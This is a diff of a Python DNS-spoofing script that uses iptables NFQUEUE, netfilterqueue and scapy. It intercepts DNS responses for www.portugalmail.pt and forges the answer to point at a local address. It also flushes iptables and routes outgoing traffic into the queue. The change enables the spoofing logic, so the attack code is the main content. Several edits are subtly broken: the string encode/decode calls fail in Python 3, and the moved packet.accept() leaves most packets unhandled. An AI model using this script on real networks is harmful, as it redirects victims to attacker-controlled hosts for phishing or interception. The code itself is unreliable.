@@ -19,7 +19,7 @@ def get_arguments():
 queue_position = get_arguments()
 
 # create a command to save information in iptable
-s_iptable = f'iptables -I FORWARD -j NFQUEUE --queue-num {str(queue_position)}'
+s_iptable = f'iptables -I OUTPUT -j NFQUEUE --queue-num {str(queue_position)}'
 
 # call function
 subprocess.call('iptables --flush', shell=True)
@@ -29,13 +29,13 @@ print(s_iptable)
 
 def process_packet(packet):
     
-    '''
+    
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
-        qname = scapy_packet[scapy.DNSQR].qname
-        if "www.portugalmail.pt" in qname:
+        qname = scapy_packet[scapy.DNSQR].qname.encode()
+        if 'www.portugalmail.pt'.encode() in qname:
             print("[+] Spoofing target")
-            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.109")
+            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.16".decode())
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
 
@@ -45,15 +45,15 @@ def process_packet(packet):
             del scapy_packet[scapy.UDP].chksum
 
             packet.set_payload(str(scapy_packet))
-    '''
-    packet.accept()
+            
+            packet.accept()
     
 
 
 # use function NetFilterQueue to execute a function in information recive
 try:
     queue = netfilterqueue.NetfilterQueue()
-    queue.bind(queue_position, process_packet)
+    queue.bind(int(queue_position), process_packet)
     queue.run()
 
 # if cancell process execute the flush in iptables
